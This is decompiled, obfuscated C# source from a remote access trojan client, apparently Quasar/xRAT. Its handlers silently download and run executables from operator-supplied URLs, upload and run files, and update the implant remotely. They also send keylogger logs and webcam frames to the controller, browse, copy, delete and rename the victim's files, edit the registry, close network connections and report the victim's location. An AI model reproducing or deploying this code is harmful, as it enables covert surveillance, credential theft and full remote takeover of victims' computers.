using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;
using System.Windows.Forms;
using AForge.Video.DirectShow;
using Microsoft.Win32;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Packets.ServerPackets;
using xClient.Core.Registry;
using xClient.Core.Utilities;

public static class GClass57
{
	public struct GStruct5
	{
		public uint uint_0;

		public uint uint_1;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public byte[] byte_0;

		public uint uint_2;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public byte[] byte_1;

		public uint uint_3;

		public IPAddress LocalAddress => new IPAddress(uint_1);

		public ushort LocalPort => BitConverter.ToUInt16(new byte[2]
		{
			byte_0[1],
			byte_0[0]
		}, 0);

		public IPAddress RemoteAddress => new IPAddress(uint_2);

		public ushort RemotePort => BitConverter.ToUInt16(new byte[2]
		{
			byte_1[1],
			byte_1[0]
		}, 0);
	}

	public struct GStruct6
	{
		public uint uint_0;

		private readonly GStruct5 gstruct5_0;
	}

	private enum Enum3
	{
		const_0,
		const_1,
		const_2,
		const_3,
		const_4,
		const_5,
		const_6,
		const_7,
		const_8
	}

	[CompilerGenerated]
	private sealed class Class31
	{
		public GClass33 gclass33_0;

		public DoClientUpdate doClientUpdate_0;

		internal void method_0()
		{
			new SetStatus("Downloading file...").Execute(gclass33_0);
			string text = GClass42.smethod_1(".exe");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.Proxy = null;
				webClient.DownloadFile(doClientUpdate_0.DownloadURL, text);
			}
			catch
			{
				new SetStatus("Download failed!").Execute(gclass33_0);
				return;
			}
			new SetStatus("Updating...").Execute(gclass33_0);
			GClass37.smethod_0(gclass33_0, text);
		}
	}

	[CompilerGenerated]
	private sealed class Class32
	{
		public bool bool_0;

		public string string_0;

		internal void method_0(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		}
	}

	[CompilerGenerated]
	private sealed class Class33
	{
		public DoDownloadFile doDownloadFile_0;

		public GClass33 gclass33_0;

		internal void method_0()
		{
			semaphore_0.WaitOne();
			try
			{
				GClass6 gClass = new GClass6(doDownloadFile_0.RemotePath);
				if (gClass.MaxBlocks < 0)
				{
					throw new Exception(gClass.LastError);
				}
				for (int i = 0; i < gClass.MaxBlocks; i++)
				{
					if (!gclass33_0.Connected)
					{
						break;
					}
					if (dictionary_1.ContainsKey(doDownloadFile_0.ID))
					{
						break;
					}
					if (gClass.method_1(i, out var readBytes))
					{
						new DoDownloadFileResponse(doDownloadFile_0.ID, Path.GetFileName(doDownloadFile_0.RemotePath), readBytes, gClass.MaxBlocks, i, gClass.LastError).Execute(gclass33_0);
						continue;
					}
					throw new Exception(gClass.LastError);
				}
			}
			catch (Exception ex)
			{
				new DoDownloadFileResponse(doDownloadFile_0.ID, Path.GetFileName(doDownloadFile_0.RemotePath), new byte[0], -1, -1, ex.Message).Execute(gclass33_0);
			}
			semaphore_0.Release();
		}
	}

	[CompilerGenerated]
	private sealed class Class34
	{
		public bool bool_0;

		public string string_0;

		internal void method_0(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		}
	}

	[CompilerGenerated]
	private sealed class Class35
	{
		public bool bool_0;

		public string string_0;

		internal void method_0(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		}
	}

	[CompilerGenerated]
	private sealed class Class36
	{
		public DoDownloadAndExecute doDownloadAndExecute_0;

		public GClass33 gclass33_0;

		internal void method_0()
		{
			string text = GClass42.smethod_1(".exe");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.Proxy = null;
				webClient.DownloadFile(doDownloadAndExecute_0.URL, text);
			}
			catch
			{
				new SetStatus("Download failed!").Execute(gclass33_0);
				return;
			}
			new SetStatus("Downloaded File!").Execute(gclass33_0);
			try
			{
				GClass42.smethod_3(text);
				if (!GClass42.smethod_2(File.ReadAllBytes(text)))
				{
					throw new Exception("no pe file");
				}
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				if (doDownloadAndExecute_0.RunHidden)
				{
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
				}
				processStartInfo.UseShellExecute = false;
				processStartInfo.FileName = text;
				Process.Start(processStartInfo);
			}
			catch
			{
				GClass8.DeleteFile(text);
				new SetStatus("Execution failed!").Execute(gclass33_0);
				return;
			}
			new SetStatus("Executed File!").Execute(gclass33_0);
		}
	}

	[CompilerGenerated]
	private sealed class Class37
	{
		public DoShowMessageBox doShowMessageBox_0;

		internal void method_0()
		{
			//IL_0030: Unknown result type (might be due to invalid IL or missing references)
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Unknown result type (might be due to invalid IL or missing references)
			MessageBox.Show(doShowMessageBox_0.Text, doShowMessageBox_0.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), doShowMessageBox_0.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), doShowMessageBox_0.MessageboxIcon), (MessageBoxDefaultButton)0, (MessageBoxOptions)131072);
		}
	}

	[CompilerGenerated]
	private sealed class Class38
	{
		public GClass33 gclass33_0;

		internal void method_0()
		{
			try
			{
				int num = 1;
				if (!Directory.Exists(Keylogger.LogDirectory))
				{
					new GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", num, 0).Execute(gclass33_0);
					return;
				}
				FileInfo[] files = new DirectoryInfo(Keylogger.LogDirectory).GetFiles();
				if (files.Length == 0)
				{
					new GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", num, 0).Execute(gclass33_0);
					return;
				}
				FileInfo[] array = files;
				foreach (FileInfo fileInfo in array)
				{
					GClass6 gClass = new GClass6(fileInfo.FullName);
					if (gClass.MaxBlocks < 0)
					{
						new GetKeyloggerLogsResponse("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(gclass33_0);
					}
					for (int j = 0; j < gClass.MaxBlocks; j++)
					{
						if (gClass.method_1(j, out var readBytes))
						{
							new GetKeyloggerLogsResponse(Path.GetFileName(fileInfo.Name), readBytes, gClass.MaxBlocks, j, gClass.LastError, num, files.Length).Execute(gclass33_0);
						}
						else
						{
							new GetKeyloggerLogsResponse("", new byte[0], -1, -1, gClass.LastError, num, files.Length).Execute(gclass33_0);
						}
					}
					num++;
				}
			}
			catch (Exception ex)
			{
				new GetKeyloggerLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(gclass33_0);
			}
		}
	}

	[Serializable]
	[CompilerGenerated]
	private sealed class Class39
	{
		public static readonly Class39 class39_0 = new Class39();

		public static Func<DriveInfo, bool> func_0;

		public static Func<string, string> func_1;

		public static Func<string, string> func_2;

		public static Func<string, string> func_3;

		public static Func<string, string> func_4;

		public static Func<string, string> func_5;

		public static Func<string, string> func_6;

		public static Func<FileInfo, bool> func_7;

		public static Func<FileInfo, string> func_8;

		public static Func<string, string> func_9;

		internal bool method_0(DriveInfo d)
		{
			return d.IsReady;
		}

		internal string method_1(string formattedKeyValue)
		{
			return "0" + formattedKeyValue;
		}

		internal string method_2(string formattedKeyValue)
		{
			return "1" + formattedKeyValue;
		}

		internal string method_3(string formattedKeyValue)
		{
			return "2" + formattedKeyValue;
		}

		internal string method_4(string formattedKeyValue)
		{
			return "3" + formattedKeyValue;
		}

		internal string method_5(string formattedKeyValue)
		{
			return "4" + formattedKeyValue;
		}

		internal string method_6(string formattedKeyValue)
		{
			return "5" + formattedKeyValue;
		}

		internal bool method_7(FileInfo file)
		{
			return file.Name != "desktop.ini";
		}

		internal string method_8(FileInfo file)
		{
			return $"{file.Name}||{file.FullName}";
		}

		internal string method_9(string formattedKeyValue)
		{
			return "6" + formattedKeyValue;
		}
	}

	public static bool bool_0;

	public static bool bool_1;

	public static GClass33 gclass33_0;

	public static int int_0;

	public static int int_1;

	public static VideoCaptureDevice videoCaptureDevice_0;

	public static UnsafeStreamCodec unsafeStreamCodec_0;

	private static Shell shell_0;

	private static Dictionary<int, string> dictionary_0 = new Dictionary<int, string>();

	private static Dictionary<int, string> dictionary_1 = new Dictionary<int, string>();

	private const string string_0 = "$E$";

	private static readonly Semaphore semaphore_0 = new Semaphore(2, 2);

	public static void smethod_0(DoLoadRegistryKey packet, GClass33 client)
	{
		GetRegistryKeysResponse getRegistryKeysResponse = new GetRegistryKeysResponse();
		try
		{
			RegistrySeeker registrySeeker = new RegistrySeeker();
			registrySeeker.BeginSeeking(packet.RootKeyName);
			getRegistryKeysResponse.Matches = registrySeeker.Matches;
			getRegistryKeysResponse.IsError = false;
		}
		catch (Exception ex)
		{
			getRegistryKeysResponse.IsError = true;
			getRegistryKeysResponse.ErrorMsg = ex.Message;
		}
		getRegistryKeysResponse.RootKey = packet.RootKeyName;
		getRegistryKeysResponse.Execute(client);
	}

	public static void smethod_1(DoCreateRegistryKey packet, GClass33 client)
	{
		GetCreateRegistryKeyResponse getCreateRegistryKeyResponse = new GetCreateRegistryKeyResponse();
		string errorMsg = "";
		string name = "";
		try
		{
			getCreateRegistryKeyResponse.IsError = !RegistryEditor.CreateRegistryKey(packet.ParentPath, out name, out errorMsg);
		}
		catch (Exception ex)
		{
			getCreateRegistryKeyResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getCreateRegistryKeyResponse.ErrorMsg = errorMsg;
		getCreateRegistryKeyResponse.Match = new RegSeekerMatch(name, GClass47.smethod_5(), 0);
		getCreateRegistryKeyResponse.ParentPath = packet.ParentPath;
		getCreateRegistryKeyResponse.Execute(client);
	}

	public static void smethod_2(DoDeleteRegistryKey packet, GClass33 client)
	{
		GetDeleteRegistryKeyResponse getDeleteRegistryKeyResponse = new GetDeleteRegistryKeyResponse();
		string errorMsg = "";
		try
		{
			getDeleteRegistryKeyResponse.IsError = !RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg);
		}
		catch (Exception ex)
		{
			getDeleteRegistryKeyResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getDeleteRegistryKeyResponse.ErrorMsg = errorMsg;
		getDeleteRegistryKeyResponse.ParentPath = packet.ParentPath;
		getDeleteRegistryKeyResponse.KeyName = packet.KeyName;
		getDeleteRegistryKeyResponse.Execute(client);
	}

	public static void smethod_3(DoRenameRegistryKey packet, GClass33 client)
	{
		GetRenameRegistryKeyResponse getRenameRegistryKeyResponse = new GetRenameRegistryKeyResponse();
		string errorMsg = "";
		try
		{
			getRenameRegistryKeyResponse.IsError = !RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg);
		}
		catch (Exception ex)
		{
			getRenameRegistryKeyResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getRenameRegistryKeyResponse.ErrorMsg = errorMsg;
		getRenameRegistryKeyResponse.ParentPath = packet.ParentPath;
		getRenameRegistryKeyResponse.OldKeyName = packet.OldKeyName;
		getRenameRegistryKeyResponse.NewKeyName = packet.NewKeyName;
		getRenameRegistryKeyResponse.Execute(client);
	}

	public static void smethod_4(DoCreateRegistryValue packet, GClass33 client)
	{
		GetCreateRegistryValueResponse getCreateRegistryValueResponse = new GetCreateRegistryValueResponse();
		string errorMsg = "";
		string name = "";
		try
		{
			getCreateRegistryValueResponse.IsError = !RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out name, out errorMsg);
		}
		catch (Exception ex)
		{
			getCreateRegistryValueResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getCreateRegistryValueResponse.ErrorMsg = errorMsg;
		getCreateRegistryValueResponse.Value = new RegValueData(name, packet.Kind, packet.Kind.GetDefault());
		getCreateRegistryValueResponse.KeyPath = packet.KeyPath;
		getCreateRegistryValueResponse.Execute(client);
	}

	public static void smethod_5(DoDeleteRegistryValue packet, GClass33 client)
	{
		GetDeleteRegistryValueResponse getDeleteRegistryValueResponse = new GetDeleteRegistryValueResponse();
		string errorMsg = "";
		try
		{
			getDeleteRegistryValueResponse.IsError = !RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg);
		}
		catch (Exception ex)
		{
			getDeleteRegistryValueResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getDeleteRegistryValueResponse.ErrorMsg = errorMsg;
		getDeleteRegistryValueResponse.ValueName = packet.ValueName;
		getDeleteRegistryValueResponse.KeyPath = packet.KeyPath;
		getDeleteRegistryValueResponse.Execute(client);
	}

	public static void smethod_6(DoRenameRegistryValue packet, GClass33 client)
	{
		GetRenameRegistryValueResponse getRenameRegistryValueResponse = new GetRenameRegistryValueResponse();
		string errorMsg = "";
		try
		{
			getRenameRegistryValueResponse.IsError = !RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg);
		}
		catch (Exception ex)
		{
			getRenameRegistryValueResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getRenameRegistryValueResponse.ErrorMsg = errorMsg;
		getRenameRegistryValueResponse.KeyPath = packet.KeyPath;
		getRenameRegistryValueResponse.OldValueName = packet.OldValueName;
		getRenameRegistryValueResponse.NewValueName = packet.NewValueName;
		getRenameRegistryValueResponse.Execute(client);
	}

	public static void smethod_7(DoChangeRegistryValue packet, GClass33 client)
	{
		GetChangeRegistryValueResponse getChangeRegistryValueResponse = new GetChangeRegistryValueResponse();
		string errorMsg = "";
		try
		{
			getChangeRegistryValueResponse.IsError = !RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg);
		}
		catch (Exception ex)
		{
			getChangeRegistryValueResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getChangeRegistryValueResponse.ErrorMsg = errorMsg;
		getChangeRegistryValueResponse.KeyPath = packet.KeyPath;
		getChangeRegistryValueResponse.Value = packet.Value;
		getChangeRegistryValueResponse.Execute(client);
	}

	public static void smethod_8(GClass33 client, GetConnections packet)
	{
		GStruct5[] array = smethod_10();
		string[] array2 = new string[array.Length];
		string[] array3 = new string[array.Length];
		string[] array4 = new string[array.Length];
		string[] array5 = new string[array.Length];
		string[] array6 = new string[array.Length];
		byte[] array7 = new byte[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array3[i] = array[i].LocalAddress.ToString();
			array4[i] = array[i].LocalPort.ToString();
			array5[i] = array[i].RemoteAddress.ToString();
			array6[i] = array[i].RemotePort.ToString();
			array7[i] = Convert.ToByte(array[i].uint_0);
			try
			{
				Process processById = Process.GetProcessById((int)array[i].uint_3);
				array2[i] = processById.ProcessName;
			}
			catch
			{
				array2[i] = $"PID: {array[i].uint_3}";
			}
		}
		new GetConnectionsResponse(array2, array3, array4, array5, array6, array7).Execute(client);
	}

	public static void smethod_9(GClass33 client, DoCloseConnection packet)
	{
		GStruct5[] array = smethod_10();
		bool flag = false;
		for (int i = 0; i < array.Length; i++)
		{
			if (packet.LocalPort.ToString() == array[i].LocalPort.ToString() && packet.RemotePort.ToString() == array[i].RemotePort.ToString())
			{
				flag = true;
				array[i].uint_0 = 12u;
				IntPtr intPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf((object)array[i]));
				Marshal.StructureToPtr((object)array[i], intPtr, fDeleteOld: false);
				SetTcpEntry(intPtr);
			}
		}
		if (flag)
		{
			smethod_8(client, new GetConnections());
		}
	}

	public static GStruct5[] smethod_10()
	{
		int ipVersion = 2;
		int dwOutBufLen = 0;
		GetExtendedTcpTable(IntPtr.Zero, ref dwOutBufLen, sort: true, 2, Enum3.const_5);
		IntPtr intPtr = Marshal.AllocHGlobal(dwOutBufLen);
		try
		{
			if (GetExtendedTcpTable(intPtr, ref dwOutBufLen, sort: true, ipVersion, Enum3.const_5) != 0)
			{
				return null;
			}
			GStruct6 gStruct = (GStruct6)Marshal.PtrToStructure(intPtr, typeof(GStruct6));
			IntPtr intPtr2 = (IntPtr)((long)intPtr + Marshal.SizeOf((object)gStruct.uint_0));
			GStruct5[] array = new GStruct5[gStruct.uint_0];
			for (int i = 0; i < gStruct.uint_0; i++)
			{
				GStruct5 gStruct2 = (array[i] = (GStruct5)Marshal.PtrToStructure(intPtr2, typeof(GStruct5)));
				intPtr2 = (IntPtr)((long)intPtr2 + Marshal.SizeOf((object)gStruct2));
			}
			return array;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	[DllImport("iphlpapi.dll", SetLastError = true)]
	private static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, Enum3 tblClass, uint reserved = 0u);

	[DllImport("iphlpapi.dll")]
	private static extern int SetTcpEntry(IntPtr pTcprow);

	public static void smethod_11(GetWebcams command, GClass33 client)
	{
		Dictionary<string, List<Size>> dictionary = new Dictionary<string, List<Size>>();
		foreach (FilterInfo item in new GClass58(GClass59.guid_1))
		{
			List<Size> list = new List<Size>();
			GClass60[] videoCapabilities = new VideoCaptureDevice(item.MonikerString).VideoCapabilities;
			foreach (GClass60 gClass in videoCapabilities)
			{
				list.Add(gClass.size_0);
			}
			dictionary.Add(item.Name, list);
		}
		if (dictionary.Count > 0)
		{
			new GetWebcamsResponse(dictionary).Execute(client);
		}
	}

	public static void smethod_12(GetWebcam command, GClass33 client)
	{
		gclass33_0 = client;
		bool_1 = true;
		int_0 = command.Webcam;
		int_1 = command.Resolution;
		if (!bool_0)
		{
			videoCaptureDevice_0 = new VideoCaptureDevice(new GClass58(GClass59.guid_1)[command.Webcam].MonikerString);
			videoCaptureDevice_0.Event_0 += smethod_14;
			videoCaptureDevice_0.VideoResolution = videoCaptureDevice_0.VideoCapabilities[command.Resolution];
			videoCaptureDevice_0.Start();
			bool_0 = true;
		}
	}

	public static void smethod_13(DoWebcamStop command, GClass33 client)
	{
		bool_1 = false;
		bool_0 = false;
		gclass33_0 = null;
		if (videoCaptureDevice_0 != null)
		{
			videoCaptureDevice_0.Event_0 -= smethod_14;
			videoCaptureDevice_0.Stop();
			videoCaptureDevice_0 = null;
		}
	}

	private static void smethod_14(object sender, GEventArgs4 e)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		if (!bool_0)
		{
			videoCaptureDevice_0.Stop();
		}
		if (bool_1)
		{
			Bitmap val = (Bitmap)((Image)e.Frame).Clone();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Bmp());
				new GetWebcamResponse(memoryStream.ToArray(), int_0, int_1).Execute(gclass33_0);
				memoryStream.Close();
			}
			bool_1 = false;
		}
	}

	public static void smethod_15(GetAuthentication command, GClass33 client)
	{
		GClass52.smethod_0();
		new GetAuthenticationResponse(GClass0.string_0, GClass46.FullName, GClass41.smethod_1(), GClass52.GeoInfo.Country, GClass52.GeoInfo.CountryCode, GClass52.GeoInfo.Region, GClass52.GeoInfo.City, GClass52.ImageIndex, GClass49.HardwareId, GClass41.smethod_0(), GClass50.smethod_1(), GClass0.string_10).Execute(client);
		if (GClass53.AddToStartupFailed)
		{
			Thread.Sleep(2000);
			new SetStatus("Adding to startup failed.").Execute(client);
		}
	}

	public static void smethod_16(DoClientUpdate command, GClass33 client)
	{
		if (string.IsNullOrEmpty(command.DownloadURL))
		{
			if (!dictionary_0.ContainsKey(command.ID))
			{
				dictionary_0.Add(command.ID, GClass42.smethod_1(".exe"));
			}
			string text = dictionary_0[command.ID];
			try
			{
				if (command.CurrentBlock == 0 && !GClass42.smethod_2(command.Block))
				{
					throw new Exception("No executable file");
				}
				GClass6 gClass = new GClass6(text);
				if (!gClass.method_2(command.Block, command.CurrentBlock))
				{
					throw new Exception(gClass.LastError);
				}
				if (command.CurrentBlock + 1 == command.MaxBlocks)
				{
					if (dictionary_0.ContainsKey(command.ID))
					{
						dictionary_0.Remove(command.ID);
					}
					new SetStatus("Updating...").Execute(client);
					GClass37.smethod_0(client, text);
				}
				return;
			}
			catch (Exception ex)
			{
				if (dictionary_0.ContainsKey(command.ID))
				{
					dictionary_0.Remove(command.ID);
				}
				GClass8.DeleteFile(text);
				new SetStatus($"Update failed: {ex.Message}").Execute(client);
				return;
			}
		}
		new Thread((ThreadStart)delegate
		{
			new SetStatus("Downloading file...").Execute(client);
			string text2 = GClass42.smethod_1(".exe");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.Proxy = null;
				webClient.DownloadFile(command.DownloadURL, text2);
			}
			catch
			{
				new SetStatus("Download failed!").Execute(client);
				return;
			}
			new SetStatus("Updating...").Execute(client);
			GClass37.smethod_0(client, text2);
		}).Start();
	}

	public static void smethod_17(DoClientUninstall command, GClass33 client)
	{
		new SetStatus("Uninstalling... bye ;(").Execute(client);
		GClass36.smethod_0(client);
	}

	public static void smethod_18(GetDirectory command, GClass33 client)
	{
		bool bool_0 = false;
		string string_0 = null;
		Action<string> action = delegate(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		};
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(command.RemotePath);
			FileInfo[] files = directoryInfo.GetFiles();
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			string[] array = new string[files.Length];
			long[] array2 = new long[files.Length];
			string[] array3 = new string[directories.Length];
			int num = 0;
			FileInfo[] array4 = files;
			foreach (FileInfo fileInfo in array4)
			{
				array[num] = fileInfo.Name;
				array2[num] = fileInfo.Length;
				num++;
			}
			if (array.Length == 0)
			{
				array = new string[1] { "$E$" };
				array2 = new long[1];
			}
			num = 0;
			DirectoryInfo[] array5 = directories;
			foreach (DirectoryInfo directoryInfo2 in array5)
			{
				array3[num] = directoryInfo2.Name;
				num++;
			}
			if (array3.Length == 0)
			{
				array3 = new string[1] { "$E$" };
			}
			new GetDirectoryResponse(array, array3, array2).Execute(client);
		}
		catch (UnauthorizedAccessException)
		{
			action("GetDirectory No permission");
		}
		catch (SecurityException)
		{
			action("GetDirectory No permission");
		}
		catch (PathTooLongException)
		{
			action("GetDirectory Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("GetDirectory Directory not found");
		}
		catch (FileNotFoundException)
		{
			action("GetDirectory File not found");
		}
		catch (IOException)
		{
			action("GetDirectory I/O error");
		}
		catch (Exception)
		{
			action("GetDirectory Failed");
		}
		finally
		{
			if (bool_0 && !string.IsNullOrEmpty(string_0))
			{
				new SetStatusFileManager(string_0, setLastDirectorySeen: true).Execute(client);
			}
		}
	}

	public static void smethod_19(DoDownloadFile command, GClass33 client)
	{
		new Thread((ThreadStart)delegate
		{
			semaphore_0.WaitOne();
			try
			{
				GClass6 gClass = new GClass6(command.RemotePath);
				if (gClass.MaxBlocks < 0)
				{
					throw new Exception(gClass.LastError);
				}
				for (int i = 0; i < gClass.MaxBlocks; i++)
				{
					if (!client.Connected)
					{
						break;
					}
					if (dictionary_1.ContainsKey(command.ID))
					{
						break;
					}
					if (!gClass.method_1(i, out var readBytes))
					{
						throw new Exception(gClass.LastError);
					}
					new DoDownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath), readBytes, gClass.MaxBlocks, i, gClass.LastError).Execute(client);
				}
			}
			catch (Exception ex)
			{
				new DoDownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath), new byte[0], -1, -1, ex.Message).Execute(client);
			}
			semaphore_0.Release();
		}).Start();
	}

	public static void smethod_20(DoDownloadFileCancel command, GClass33 client)
	{
		if (!dictionary_1.ContainsKey(command.ID))
		{
			dictionary_1.Add(command.ID, "canceled");
			new DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled").Execute(client);
		}
	}

	public static void smethod_21(DoUploadFile command, GClass33 client)
	{
		if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
		{
			GClass8.DeleteFile(command.RemotePath);
		}
		new GClass6(command.RemotePath).method_2(command.Block, command.CurrentBlock);
	}

	public static void smethod_22(DoPathDelete command, GClass33 client)
	{
		bool bool_0 = false;
		string string_0 = null;
		Action<string> action = delegate(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		};
		try
		{
			switch (command.PathType)
			{
			case GEnum1.const_1:
				Directory.Delete(command.Path, recursive: true);
				new SetStatusFileManager("Deleted directory", setLastDirectorySeen: false).Execute(client);
				break;
			case GEnum1.const_0:
				File.Delete(command.Path);
				new SetStatusFileManager("Deleted file", setLastDirectorySeen: false).Execute(client);
				break;
			}
			smethod_18(new GetDirectory(Path.GetDirectoryName(command.Path)), client);
		}
		catch (UnauthorizedAccessException)
		{
			action("DeletePath No permission");
		}
		catch (PathTooLongException)
		{
			action("DeletePath Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("DeletePath Path not found");
		}
		catch (IOException)
		{
			action("DeletePath I/O error");
		}
		catch (Exception)
		{
			action("DeletePath Failed");
		}
		finally
		{
			if (bool_0 && !string.IsNullOrEmpty(string_0))
			{
				new SetStatusFileManager(string_0, setLastDirectorySeen: false).Execute(client);
			}
		}
	}

	public static void smethod_23(DoPathRename command, GClass33 client)
	{
		bool bool_0 = false;
		string string_0 = null;
		Action<string> action = delegate(string msg)
		{
			bool_0 = true;
			string_0 = msg;
		};
		try
		{
			switch (command.PathType)
			{
			case GEnum1.const_1:
				Directory.Move(command.Path, command.NewPath);
				new SetStatusFileManager("Renamed directory", setLastDirectorySeen: false).Execute(client);
				break;
			case GEnum1.const_0:
				File.Move(command.Path, command.NewPath);
				new SetStatusFileManager("Renamed file", setLastDirectorySeen: false).Execute(client);
				break;
			}
			smethod_18(new GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
		}
		catch (UnauthorizedAccessException)
		{
			action("RenamePath No permission");
		}
		catch (PathTooLongException)
		{
			action("RenamePath Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("RenamePath Path not found");
		}
		catch (IOException)
		{
			action("RenamePath I/O error");
		}
		catch (Exception)
		{
			action("RenamePath Failed");
		}
		finally
		{
			if (bool_0 && !string.IsNullOrEmpty(string_0))
			{
				new SetStatusFileManager(string_0, setLastDirectorySeen: false).Execute(client);
			}
		}
	}

	public static void smethod_24(DoDownloadAndExecute command, GClass33 client)
	{
		new SetStatus("Downloading file...").Execute(client);
		new Thread((ThreadStart)delegate
		{
			string text = GClass42.smethod_1(".exe");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.Proxy = null;
				webClient.DownloadFile(command.URL, text);
			}
			catch
			{
				new SetStatus("Download failed!").Execute(client);
				return;
			}
			new SetStatus("Downloaded File!").Execute(client);
			try
			{
				GClass42.smethod_3(text);
				if (!GClass42.smethod_2(File.ReadAllBytes(text)))
				{
					throw new Exception("no pe file");
				}
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				if (command.RunHidden)
				{
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
				}
				processStartInfo.UseShellExecute = false;
				processStartInfo.FileName = text;
				Process.Start(processStartInfo);
			}
			catch
			{
				GClass8.DeleteFile(text);
				new SetStatus("Execution failed!").Execute(client);
				return;
			}
			new SetStatus("Executed File!").Execute(client);
		}).Start();
	}

	public static void smethod_25(DoUploadAndExecute command, GClass33 client)
	{
		if (!dictionary_0.ContainsKey(command.ID))
		{
			dictionary_0.Add(command.ID, GClass42.smethod_1(Path.GetExtension(command.FileName)));
		}
		string text = dictionary_0[command.ID];
		try
		{
			if (command.CurrentBlock == 0 && Path.GetExtension(text) == ".exe" && !GClass42.smethod_2(command.Block))
			{
				throw new Exception("No executable file");
			}
			GClass6 gClass = new GClass6(text);
			if (!gClass.method_2(command.Block, command.CurrentBlock))
			{
				throw new Exception(gClass.LastError);
			}
			if (command.CurrentBlock + 1 == command.MaxBlocks)
			{
				if (dictionary_0.ContainsKey(command.ID))
				{
					dictionary_0.Remove(command.ID);
				}
				GClass42.smethod_3(text);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				if (command.RunHidden)
				{
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.CreateNoWindow = true;
				}
				processStartInfo.UseShellExecute = false;
				processStartInfo.FileName = text;
				Process.Start(processStartInfo);
				new SetStatus("Executed File!").Execute(client);
			}
		}
		catch (Exception ex)
		{
			if (dictionary_0.ContainsKey(command.ID))
			{
				dictionary_0.Remove(command.ID);
			}
			GClass8.DeleteFile(text);
			new SetStatus($"Execution failed: {ex.Message}").Execute(client);
		}
	}

	public static void smethod_26(DoVisitWebsite command, GClass33 client)
	{
		string text = command.URL;
		if (!text.StartsWith("http"))
		{
			text = "http://" + text;
		}
		if (!Uri.IsWellFormedUriString(text, UriKind.RelativeOrAbsolute))
		{
			return;
		}
		if (!command.Hidden)
		{
			Process.Start(text);
		}
		else
		{
			try
			{
				HttpWebRequest obj = (HttpWebRequest)WebRequest.Create(text);
				obj.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A";
				obj.AllowAutoRedirect = true;
				obj.Timeout = 10000;
				obj.Method = "GET";
				using ((HttpWebResponse)obj.GetResponse())
				{
				}
			}
			catch
			{
			}
		}
		new SetStatus("Visited Website").Execute(client);
	}

	public static void smethod_27(DoShowMessageBox command, GClass33 client)
	{
		new Thread((ThreadStart)delegate
		{
			//IL_0030: Unknown result type (might be due to invalid IL or missing references)
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_005a: Unknown result type (might be due to invalid IL or missing references)
			MessageBox.Show(command.Text, command.Caption, (MessageBoxButtons)Enum.Parse(typeof(MessageBoxButtons), command.MessageboxButton), (MessageBoxIcon)Enum.Parse(typeof(MessageBoxIcon), command.MessageboxIcon), (MessageBoxDefaultButton)0, (MessageBoxOptions)131072);
		}).Start();
		new SetStatus("Showed Messagebox").Execute(client);
	}

